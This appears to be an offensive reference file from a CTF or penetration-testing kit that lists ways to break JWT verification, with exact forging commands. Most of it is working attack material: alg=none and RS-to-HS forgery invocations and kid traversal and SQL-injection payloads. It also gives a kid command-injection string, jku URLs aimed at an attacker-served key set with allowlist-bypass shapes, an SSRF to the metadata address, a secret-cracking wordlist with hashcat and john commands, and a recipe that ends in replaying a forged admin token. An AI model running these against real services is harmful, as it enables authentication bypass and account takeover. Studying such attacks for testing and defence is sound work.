# JWT deep — the attack surface, layer by layer

`jwt-attacks.md` is the field summary; this file is the full reference —
signature algorithms, verification bugs, per-library quirks, and the exact
`jwt_forge.py` / `session_dissect.py` invocations that execute each one.

---

## 1. Anatomy — what the three parts really are

```
header  . payload  . signature
eyJhbGciOi... . eyJzdWIiOi... . SflKxwRJSM...
b64url(J) . b64url(J)           b64url(sign(header.payload))
```

- **header**: `{"alg":"HS256","typ":"JWT","kid":"...","jku":"...","x5u":"...","cty":"..."}`
- **payload**: registered claims (`iss sub aud exp nbf iat jti`) + private claims
- **signature**: `HMAC-SHA256(b64(h)+"."+b64(p), secret)` for `HS*`;
  `RSASSA-PKCS1v15`/`ECDSA`/`EdDSA` for `RS*`/`ES*`/`EdDSA`; absent for `none`.

Decode locally:

```bash
python3 -c 'import base64,sys;[print(base64.urlsafe_b64decode(p+"="*(-len(p)%4))) for p in sys.argv[1].split(".")[:2]]' "$TOKEN"
python3 tools/web/session_dissect.py --token "$TOKEN" --challenge "$C"
```

## 2. The verification-bug table

| Bug | Header sent | What the verifier does | Result |
|---|---|---|---|
| alg=none honored | `{"alg":"none"}` | skips signature check | forge any claims |
| `None`/`NONE`/`nOnE` | case variant | same, bypasses lowercase filter | forge |
| trailing `.` | `aaa.bbb.` | empty signature accepted | forge |
| alg confusion RS→HS | `{"alg":"HS256"}` signed with **public** PEM | HMAC-with-PEM verifies | forge |
| alg confusion RS→HS on EC key | same with EC pubkey | same | forge |
| algorithm list too broad | `algorithms:["RS256","HS256"]` in code | attacker picks HS256 | forge |
| `verify_signature:false` | anything | library skips crypto | forge |
| `jwt.decode()` no verify | anything | parses, never checks | forge |
| empty secret | `HS256` + `""` key | signature verifies | forge |
| secret in wordlist | `HS256` + `secret` | dictionary attack offline | forge |
| `kid` traversal | `{"kid":"../../dev/null"}` | key file = empty bytes | sign with empty secret |
| `kid` SQLi | `{"kid":"x' UNION SELECT 'key'"}` | key fetched via SQL | sign with chosen key |
| `kid` cmdi | `{"kid":"x|id"}` | key name into command | RCE |
| `jku` self-hosted | `{"jku":"https://you/jwks.json"}` | fetches your JWKS | forge with your key |
| `jku` SSRF | `{"jku":"http://169.254.169.254/..."}` | server fetches internal URL | SSRF |
| `x5u` self-cert | `{"x5u":"https://you/cert.pem"}` | trusts your cert URL | forge |
| `x5c` embedded | `{"x5c":["<your cert>"]}` | cert from token itself | forge |
| exp ignored | expired token accepted | replay forever | n/a |
| `nbf`/`iat` only | signature unchecked | forge | forge |
| `aud` not checked | token for service A used on B | confused deputy | cross-service |
| `iss` not checked | token from another issuer | cross-tenant | |
| `sub` coercion | `"sub":"1"` vs `1` | type confusion → user 1 | |
| `sub` injection | `"sub":"admin'--"` | claim into query | SQLi |

## 3. alg=none — every form the parser accepts

```bash
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg ''
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg none   # alg field is free-form
```

Hand-built variants to try when the tool's output is filtered:

```
{"alg":"none"},{"alg":"None"},{"alg":"NONE"},{"alg":"nOnE"}
{"alg":"noNe"},{"alg":"NONE","typ":"JWT"},{"alg":"none","cty":"JWT"}
{"alg":"none"} + trailing "."          # aaa.bbb.
{"alg":"none"} + no trailing "."       # aaa.bbb     (some parsers want it)
{"alg":"NONE"} + trailing ".."         # rare triple-dot parsers
```

Verify each against the target; record which exact spelling passed — the
verifier's filter tells you the library.

## 4. RS→HS confusion — the standard recipe

Precondition: token signed `RS256`, and you hold the **public** key (it's
public — `/jwks.json`, `.well-known`, cert, or in the bundle).

```bash
# get the PEM — from jwks endpoint, TLS cert, or the repo
curl -s "$BASE/.well-known/jwks.json"
openssl s_client -connect host:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout

python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --pubkey pubkey.pem
```

The verifier does `verify(t, public_key, algorithms=["RS256","HS256"])` —
alg comes from the header, so `HS256` + HMAC-with-PEM-bytes verifies.
Pem-line-wrap quirk: some libraries read the file bytes, others the decoded
DER — `jwt_forge --pubkey` uses the file bytes; if it fails, retry with the
base64 body as `--secret` and with the DER bytes.

## 5. kid / jku / x5u — header injection

`jwt_forge.py` flags verified: `--kid`, `--kid-secret`, `--jku`.

```bash
# kid path traversal — empty secret via /dev/null
python3 tools/web/jwt_forge.py --token "$T" --kid ../../../../dev/null --kid-secret ''
# static file whose content you know
python3 tools/web/jwt_forge.py --token "$T" --kid /proc/sys/kernel/randomize_va_space --kid-secret '2'
python3 tools/web/jwt_forge.py --token "$T" --kid /etc/hostname --kid-secret '<its bytes>'
# kid → SQL injection into the key-lookup query
# "kid":"x' UNION SELECT 'attackerkey' --"  then --kid-secret attackerkey
# jku — serve your own JWKS
python3 tools/web/jwt_forge.py --token "$T" --jku "https://$YOUR/jwks.json"
python3 tools/web/jwt_forge.py --token "$T" --jku "https://$YOUR@trusted.com/../jwks.json"   # allowlist bypass shapes
python3 tools/web/jwt_forge.py --token "$T" --jku "https://trusted.com@$YOUR/jwks.json"
python3 tools/web/jwt_forge.py --token "$T" --jku "https://trusted.com.$YOUR/jwks.json"
python3 tools/web/jwt_forge.py --token "$T" --jku "https://trusted.com%2f.$YOUR/jwks.json"
python3 tools/web/jwt_forge.py --token "$T" --jku "https://trusted.com/$YOUR/jwks.json"   # open-redirect-on-host chain
```

JWKS you serve:

```json
{"keys":[{"kty":"RSA","kid":"a","use":"sig","alg":"RS256","n":"<your n>","e":"AQAB"}]}
```

or for symmetric-verifying parsers:

```json
{"keys":[{"kty":"oct","kid":"a","k":"<b64url secret>"}]}
```

`x5u`/`x5c` variants: same idea, cert instead of JWKS.

## 6. Weak secrets — the dictionary attack

```bash
python3 tools/web/session_dissect.py --token "$T" --try-keys --wordlist skills/web-auth-session/references/wordlists.md   # not a wordlist format; use a secrets file
python3 tools/web/session_dissect.py --token "$T" --try-keys --wordlist /path/secrets.txt --max-keys 200000
hashcat -m 16500 -a 0 "$T" wordlist.txt    # JWT HS256
john --format=HMAC-SHA256 --wordlist=w.txt token.jwt
```

High-yield secrets to try first (CTF frequency):

```
secret, secret123, secretkey, secret_key, jwt_secret, JWT_SECRET,
your-256-bit-secret, your_jwt_secret, supersecret, super_secret,
changeme, change_me, password, password123, admin, admin123,
key, privatekey, private_key, signingkey, signing_key, mykey,
my_secret, my_secret_key, my-secret-key, hs256, hmacsecret,
token, token_secret, auth, auth_secret, session, session_secret,
test, testing, dev, development, debug, local, localhost,
123456, 12345678, 1234567890, qwerty, letmein, welcome1,
flask-secret, django-secret, rails-secret, express-secret,
keyboard-cat, shhhhh, s3cr3t, s3cr3t!, S3cr3t, p@ssw0rd,
iloveyou, monkey, dragon, master, sunshine, princess,
the secret, thisissecret, this_is_secret, hard!to-guess,
banana, apple, orange, grape, kiwi, mango, lemon, cherry,
<appname>, <appname>-secret, <appname>_secret, <appname>123,
<domain>, <domain>-secret, jwt, jwt123, jwttoken, jwtsecret,
sup3rs3cr3t, unguessable, notsecret, fake_secret, temp_secret
```

## 7. Claim-side bugs that don't need the signature

- **`exp` replay**: expired token still accepted — test by flipping `exp`
  to 1970 on a valid signature.
- **`aud`/`iss` confused deputy**: a token minted for service A accepted
  by service B on the same key — try the login JWT on the admin API.
- **`sub`/`uid` coercion**: `"sub":"1"` vs `"sub":1` vs `"sub":"01"` vs
  `"sub":"1e0"` — numeric-string coercion reaches another user.
- **claim injection**: `{"name":"x\",\"role\":\"admin"}` — if the claim is
  concatenated into a JSON string server-side.
- **claim into query**: `{"sub":"1' OR '1'='1"}` when `sub` lands in SQL.
- **`jti` replay**: `jti` in a tiny allowlist → reuse; `jti` not stored →
  "revoked" tokens still work.
- **`iat`/`nbf` clock-skew**: `nbf` in the future accepted because skew
  is generous.

## 8. Per-library quirks

| Library | Known trap |
|---|---|
| pyjwt <2.0 | `jwt.decode(t, verify=False)`; `algorithms` required since 2.0 |
| pyjwt ≥2.0 | `options={"verify_signature":False}` still exists |
| jsonwebtoken (node) | `verify(t,key)` takes alg from header unless `algorithms:[...]` pinned; `decode()` never verifies |
| jjwt (java) | `parse()` vs `parseClaimsJws()` — the former may skip sig on plain JWT |
| golang-jwt/jwt-go | `Parse` with `nil` key on `alg=none` — `jwt.UnsafeAllowNoneSignatureType` gate exists but often bypassed |
| ruby-jwt | `JWT.decode t, nil, false` — third arg skips verify |
| firebase/php-jwt | `$JWT::decode($t, new Key($secret,'HS256'))` — Key alg pinned; older `decode($t,$secret,['HS256','RS256'])` confusable |
| System.IdentityModel.Tokens.Jwt (.NET) | `RequireSignedTokens=false`, `ValidateIssuerSigningKey=false` |
| Nimbus JOSE (java) | accepts `none` when `Algorithm.NONE` in expected set |
| jose (node) | strict by default — `aud`/`iss` explicit; kid lookup via `createRemoteJWKSet` follows `jku` ONLY if coded to |
| Auth0/java-jwt | `JWT.require(Algorithm.HMAC256(k))` pins alg; `Algorithm.none()` accepted if coded |
| lua-resty-jwt | `verify(t, secret)` — alg from header |

Rule: **find the verify call in source and list its accepted alg set**.
The bug is almost always a too-broad set, a `verify=False`, or a missing
call entirely (`decode` for claims then trust).

## 9. Offline recipe order

```bash
# 1. dissect
python3 tools/web/session_dissect.py --token "$T" --challenge "$C"

# 2. alg=none / empty-sig
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg ''

# 3. weak secret
python3 tools/web/session_dissect.py --token "$T" --try-keys --wordlist secrets.txt

# 4. RS->HS (if alg=RS* and pubkey reachable)
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --pubkey pubkey.pem

# 5. kid traversal
python3 tools/web/jwt_forge.py --token "$T" --kid ../../../../dev/null --kid-secret ''

# 6. jku
python3 tools/web/jwt_forge.py --token "$T" --jku "https://$YOU/jwks.json"
```

Each is one `--claims` away from a forged token; verify acceptance with
`http_probe.py --header "Authorization: Bearer $FORGED"` against the
protected endpoint.
